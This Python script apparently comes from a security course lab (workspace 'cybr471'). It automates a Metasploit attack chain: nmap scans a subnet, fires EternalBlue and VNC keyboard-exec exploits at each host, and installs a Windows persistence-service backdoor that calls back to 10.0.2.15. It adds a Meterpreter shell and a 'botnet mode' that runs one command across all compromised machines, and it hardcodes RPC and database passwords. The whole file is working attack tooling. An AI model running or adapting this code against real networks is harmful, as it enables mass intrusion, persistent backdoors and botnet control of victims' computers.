from pymetasploit3.msfrpc import MsfRpcClient, Workspace, WorkspaceManager, HostsTable, MsfError, MeterpreterSession, MsfConsole
import pandas as pd
import os
import nmap3
import time
import sys
import re
from targetmanager import TargetManager, Target
from inpututils import InputUtils

nmap = nmap3.Nmap()

def perform_scan():
    try:
        subnet = InputUtils.get_text_input('Enter subnet:',r'\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}\/\d{1,3}')
        print('Scanning...')
        nmap.scan_command(subnet, arg='-O -sV')
        print('Scanning Complete')
        return nmap.raw_ouput
    except Exception as e:
        print(e)

def exploit_target(console, exploit, payload, options):
    options_str = 'use {}/{}\n'.format('exploit', exploit)
    if payload is not None:
        options_str += 'set PAYLOAD {}\n'.format(payload)

    for option in options:
        options_str += 'set {} {}\n'.format(option[0], option[1])

    options_str += 'run -z\n'

    console.write(options_str)
    data = ''
    while data == '' or console.is_busy():
        time.sleep(1)
        cons_read = console.read()['data']
        out_match = re.match(r'\[[*,+,-]\].*', cons_read)
        if out_match is not None:
            print(cons_read, end='')
        end_match = re.match(r'(.+) (Meterpreter session) (\d{1,2}) opened (.+)', cons_read)
        sys.stdout.flush()
        if end_match:
            return end_match.group(3)
        
        data += cons_read
    
    print()
    return -1

def meterpreter_session(client : MsfRpcClient, target : Target):
    # TODO detect if host is down
    try:
        print('Session creation successful')
        shell = target.session
        cmd = None
        while True:
            print('>>> ', end='')
            cmd = input()
            if 'exit' in cmd:
                shell.stop()
                target.stop_session()
                break
            elif 'bg' in cmd:
                break
            if 'cd' in cmd:
                shell.runsingle(cmd)
            else:
                print(shell.run_with_output(cmd))
    except MsfError as e:
        print('Stopping shell: ' + str(e))
        target.stop_session()
        target.update_online_status()

def exit_sessions(client):
    for sid in client.sessions.list.keys():
        print('Stopping session ' + sid)
        client.sessions.session(sid).stop()
    
    for cons in client.consoles.list:
        print('Destroying console ' + cons['id'])
        client.consoles.destroy(cons['id'])  

def set_persistence(console, sid, port):
    options = []
    options.append(['LHOST', '10.0.2.15'])
    options.append(['LPORT', port])
    options.append(['session', sid])

    return exploit_target(console, 'windows/local/persistence_service', None, options)

def perform_exploit(client : MsfRpcClient, console : MsfConsole, tm : TargetManager, exploits):
    targets = tm.get_targets_dict()

    for target in targets.keys():
            current_target = targets[target]
            print('\n=====================================')
            print('Trying to exploit: ' + target)
            print('=====================================')
            if current_target.is_exploited():
                print('Already Exploited!')
                continue

            if current_target.status == 'Offline':
                print('Target offline')
                continue

            if current_target.backdoor == True:
                ## try use the backdoor payload
                print('Target has backdoor')
                ex_sid = exploit_target(console, 'multi/handler', 'windows/meterpreter/reverse_tcp', [['LHOST', '10.0.2.15'], ['LPORT', current_target.backdoor_port]])
                if int(ex_sid) > 0:
                    print('Backdoor Success')
                    current_target.session = client.sessions.session(ex_sid)
                    current_target.how_exploited = 'Backdoor'
                    continue
                else:
                    print('Backdoor failed')
            
            for exploit in exploits:
                print('-> Using exploit: ' + exploit)
                ex_sid = exploit_target(console, exploit, None, [['RHOSTS', target]])
                
                if int(ex_sid) > 0: # Success
                    print('Success!')
                    current_target.session = client.sessions.session(ex_sid)
                    current_target.how_exploited = exploit
                    # Add persistence
                    print('=====================================')
                    print('ADDING PERSISTENCE')
                    print('=====================================')
                    bd_port = tm.get_unique_port()

                    p_sid = set_persistence(console, ex_sid, bd_port)
                    
                    if int(p_sid) > 0:
                        tm.set_backdoor(current_target, bd_port)
                        client.sessions.session(p_sid).stop()
                    else:
                        print('Persistence failed')
                    break
                else:
                    print('Exploit failed, trying next...')

def botnet_session(client : MsfRpcClient, targets):
        cmd = ''
        while 'exit' not in cmd and 'bg' not in cmd:
            print(cmd)
            print('>>> ', end='')
            cmd = input()

            for target in targets:
                if target.session is None:
                    continue
                try:
                    output = '======== Output for target ' + target.ip + '========\n'
                    if 'exit' in cmd:
                        target.session.stop()
                        target.stop_session()
                    elif 'bg' in cmd:
                        break
                    if 'cd' in cmd:
                        target.session.runsingle(cmd)
                    else:
                        output += target.session.run_with_output(cmd) + '\n'
                    print(output)
                except MsfError as e:
                    print('Stopping session: ' + str(e))
                    target.stop_session()
                    target.update_online_status()

def find_exploits(console : MsfConsole):
    potential_exploits = ['windows/smb/ms17_010_eternalblue', 'multi/vnc/vnc_keyboard_exec']
    exploits = []
    for exploit in potential_exploits:
        console.write('search type:exploit platform:windows ' + exploit)
        
        output = ''
        while output == '' or console.is_busy():
            output += console.read()['data']
                
        if output != '':
            exploits.append(exploit)

    return exploits

def main():
    try:
        client = MsfRpcClient('uDIBkUec')
        print('Initialised MSF RPC client')
        client.db.connect('msf', 'msf', password='mbAfW9rRpXCsOAzkwBQeopVG+vms7b8+LgVhrFGPfEo=')

        scan = InputUtils.get_number_input('Use existing database (0), Perform new scan (1)', 1) == 1

        if scan: 
            wsm = WorkspaceManager(client)
            wsm.remove('cybr471') # remove previous database
            wsm.add('cybr471') # add new database
            print('Database connection established')
            results = perform_scan()

        workspace = Workspace(client, 'cybr471')
        if scan:
            workspace.importdata(results)
            print('Scan data imported to MSF successfully')

        target_manager = TargetManager(workspace.hosts)
        target_manager.parse_targets_from_host(workspace.hosts.list)
        print('Purge old sessions...')
        exit_sessions(client)

        console = client.consoles.console()
        print('Initialising console...')
        time.sleep(3)

        while True:
            targets_all = target_manager.get_targets_df()
            print('\n===================== All Targets =====================')
            print(targets_all)
            print('=======================================================')

            #######################
            t_select = InputUtils.get_number_input('Exploit vulnerable hosts (0), Use meterpreter session (1), Exit (2)', 2)
            if t_select == 0:
                potential_exploits = find_exploits(console)
                if len(potential_exploits) > 0:
                    print('Found potential exploits!')
                perform_exploit(client, console, target_manager, potential_exploits)
            elif t_select == 1:
                targets_exp = target_manager.get_targets_df(True)
                if len(targets_exp) == 0:
                    print('No targets exploited')
                    continue

                print('\n================== Exploited Targets ==================')
                print(targets_exp)
                print('=======================================================')

                t_select = InputUtils.get_number_input('Enter host session (host #), Botnet mode (0)', len(targets_exp))
                if t_select == 0:
                    print('BOTNET MODE')
                    t_dict = target_manager.get_targets_dict()
                    t = [t_dict[ip] for ip in t_dict.keys()]
                    botnet_session(client, t)
                else:
                    target = target_manager.get_target(targets_exp.loc[t_select]['IP'])
                    meterpreter_session(client, target)
            else:
                break


        ########################
        exit_sessions(client)   

    except Exception as e:
        print('Error: ' + str(e))

if __name__== '__main__':
    main()